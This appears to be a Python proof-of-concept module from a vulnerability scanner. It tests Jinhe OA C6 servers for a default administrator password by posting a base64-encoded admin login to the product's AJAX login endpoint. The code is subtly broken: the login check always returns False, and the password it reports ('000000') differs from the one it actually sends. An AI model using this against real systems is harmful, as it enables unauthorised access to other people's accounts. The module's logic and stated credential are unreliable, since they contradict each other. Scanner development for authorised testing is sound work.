# -*- coding:utf-8 -*-
# 金和OA C6 管理员默认口令

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def admin_test(self):
        resp = self.requestUtil.post(url=self.service.url + "/C6/Jhsoft.Web.login/AjaxForLogin.aspx",
                                data="type=login&loginCode=YWRtaW4=&&pwd=WHh6eDY5OTQ0NTY=&")
        return False

    def fingerprint(self):
        try:
            if self.service.url:
                resp = self.requestUtil.get(self.service.url)
                if "c6" in resp.text.lower():
                    return True
        except:
            return False

    def poc(self):
        try:
            if self.admin_test():
                return ["金和OA C6 管理员默认口令", "用户名: admin<br>密码: 000000"]
        except:
            return []
